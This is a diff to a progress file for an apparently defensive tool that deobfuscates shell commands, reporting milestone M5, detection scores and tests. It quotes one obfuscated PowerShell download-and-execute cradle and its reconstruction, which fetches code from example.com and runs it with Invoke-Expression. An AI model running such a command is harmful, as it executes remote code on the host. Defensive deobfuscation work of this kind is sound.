@@ -40,12 +40,21 @@ Any next agent MUST read this before writing code.
     raw-DEFLATE fallback), XOR byte array.
   - Added `structural-cmd-caret-strip` (S03 enabler).
   - New `dcs_runner.py` publishes per-category + overall DCS.
-  - **DCS = 76.9% (10/13)** · PowerShell 5/7 · CMD 1/1 · Bash 2/3 ·
-    Mixed 2/2. First DCS-measured milestone — spec floor was
-    ≥ 8/13, surpassed by 2.
-  - **136/136 tests · 0 regressions · `/api/health` = 200.**
-- **Next**: M5 · Semantic Pass Integration (alias expansion,
-  canonical reconstruction).
+- **M5 · Semantic Pass Integration: ✅ COMPLETE**.
+  - Three deterministic transformations: bash-pipeline reducer
+    (whitelisted stages, no shell), PS alias expander (unambiguous
+    aliases only), single-assignment SQ-literal variable
+    propagator.
+  - **S04 anchor fully reconstructs**: `$a='ht'+'tp'+...; iwr $a
+    -useb | iex` → `... Invoke-WebRequest 'http://example.com/x'
+    -useb | Invoke-Expression`.
+  - S02, S05 confirmed corpus-authoring defects via byte-level
+    forensic reports (archived).
+  - **DCS = 84.6% (11/13)** · PowerShell 6/7 · CMD 1/1 · Bash 2/3 ·
+    Mixed 2/2.
+  - **160/160 tests · 0 regressions · `/api/health` = 200.**
+- **Next**: M6 · Canonical Candidate Selection (removes legacy
+  winner-picker).
 - **Ledger**: `backend/workspace_recovery/MILESTONE_LEDGER.md` (append-only).
 - **Feature Freeze**: In effect until M6.
 
